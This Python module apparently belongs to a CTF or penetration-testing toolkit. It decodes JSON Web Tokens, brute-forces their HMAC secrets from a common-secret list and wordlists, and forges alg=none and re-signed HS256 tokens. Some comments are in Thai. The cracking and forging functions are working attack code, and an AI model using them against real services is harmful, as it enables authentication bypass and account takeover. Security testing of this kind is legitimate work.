"""JWT analysis: decode, verify with common secrets, alg=none probe."""
import base64
import hashlib
import hmac
import json
import os

from core.parallel import pmap

WORDLISTS = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "wordlists"))

COMMON_SECRETS = [
    "secret", "password", "password123", "admin", "key", "jwt", "jwt-secret",
    "jwt_secret", "supersecret", "super-secret", "changeme", "test", "test123",
    "your-256-bit-secret", "your-256-bit-secret-key", "qwerty", "123456",
    "letmein", "secret_key", "secretkey", "s3cr3t", "JWT_SECRET", "SECRET",
    "strongsecret", "notasecret", "thisisasecret", "hackthebox", "htb",
    "flag", "ctf", "topsecret",
]

ALGOS = {
    "HS256": hashlib.sha256,
    "HS384": hashlib.sha384,
    "HS512": hashlib.sha512,
}


def b64url_decode(part):
    pad = "=" * (-len(part) % 4)
    try:
        return base64.urlsafe_b64decode(part + pad)
    except Exception:
        return None


def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def decode(token):
    """Returns (header, payload, signature) as dicts/bytes or None."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        return None
    header_raw = b64url_decode(parts[0])
    payload_raw = b64url_decode(parts[1])
    if header_raw is None or payload_raw is None:
        return None
    try:
        header = json.loads(header_raw)
    except Exception:
        header = {"raw": header_raw.decode("latin-1", "replace")}
    try:
        payload = json.loads(payload_raw)
    except Exception:
        payload = {"raw": payload_raw.decode("latin-1", "replace")}
    return header, payload, parts[2]


def _sign(data, secret, alg):
    h = ALGOS.get(alg.upper())
    if not h:
        return None
    return b64url_encode(hmac.new(secret.encode(), data.encode(), h).digest())


def check_secret(token, secret):
    """Verify HS* signature against a secret."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        return False
    header_raw, payload_raw = parts[0], parts[1]
    try:
        header = json.loads(b64url_decode(header_raw))
    except Exception:
        return False
    alg = header.get("alg", "")
    sig = _sign(f"{header_raw}.{payload_raw}", secret, alg)
    if sig is None:
        return False
    return hmac.compare_digest(sig, parts[2])


def crack_secret(token, wordlist=None, workers=16):
    """Try common + wordlist secrets against the token."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(b64url_decode(parts[0]))
    except Exception:
        return None
    alg = header.get("alg", "")
    if alg.upper() not in ALGOS:
        return None
    secrets = list(COMMON_SECRETS)
    if wordlist and os.path.exists(wordlist):
        with open(wordlist, encoding="utf-8", errors="ignore") as f:
            secrets.extend(line.strip() for line in f if line.strip())
    seen = set()
    secrets = [s for s in secrets if not (s in seen or seen.add(s))]

    def try_secret(s):
        return s if check_secret(token, s) else None

    for _, r in pmap(try_secret, secrets, workers=workers, desc="jwt secret"):
        if r:
            return r
    return None


def forge_alg_none(token):
    """Build a token with alg=none for testing."""
    parts = token.strip().split(".")
    header_raw = b64url_decode(parts[0])
    payload_raw = b64url_decode(parts[1])
    if header_raw is None or payload_raw is None:
        return None
    try:
        header = json.loads(header_raw)
    except Exception:
        return None
    header["alg"] = "none"
    new_header = b64url_encode(json.dumps(header, separators=(",", ":")))
    new_payload = b64url_encode(payload_raw)
    return f"{new_header}.{new_payload}."


def forge_hs256(token, secret):
    """Re-sign the same payload with HS256 + secret."""
    parts = token.strip().split(".")
    header_raw = b64url_decode(parts[0])
    payload_raw = b64url_decode(parts[1])
    if header_raw is None or payload_raw is None:
        return None
    try:
        header = json.loads(header_raw)
    except Exception:
        return None
    header["alg"] = "HS256"
    h = b64url_encode(json.dumps(header, separators=(",", ":")))
    p = b64url_encode(payload_raw)
    sig = _sign(f"{h}.{p}", secret, "HS256")
    return f"{h}.{p}.{sig}"


def analyze_jwt(token):
    """Full JWT analysis. Returns dict with findings."""
    result = {"token": token, "header": None, "payload": None, "issues": []}
    decoded = decode(token)
    if not decoded:
        result["issues"].append("token ไม่ถูกต้อง (ต้องมี 3 ส่วน)")
        return result
    header, payload, sig = decoded
    result["header"] = header
    result["payload"] = payload
    alg = header.get("alg", "")
    if alg.lower() == "none":
        result["issues"].append("alg=none! server อาจยอมรับ token ไม่มีลายเซ็น")
    # Header-controlled key locations are the other high-value JWT trust
    # boundary.  Do not call them exploitable by themselves; the Web scanner
    # will replay a signed mutation and require a protected flag response.
    for key in ("jku", "jwk", "kid"):
        if key in header:
            result["issues"].append(
                f"header มี {key} — ตรวจสอบ key lookup / attacker-controlled JWK chain")
    if not sig:
        result["issues"].append("ไม่มี signature")
    secret = crack_secret(token)
    if secret:
        result["secret"] = secret
        result["issues"].append(f"HS{alg[-3:]} secret ถูก crack: {secret!r}")
        result["forged"] = forge_hs256(token, secret)
    return result
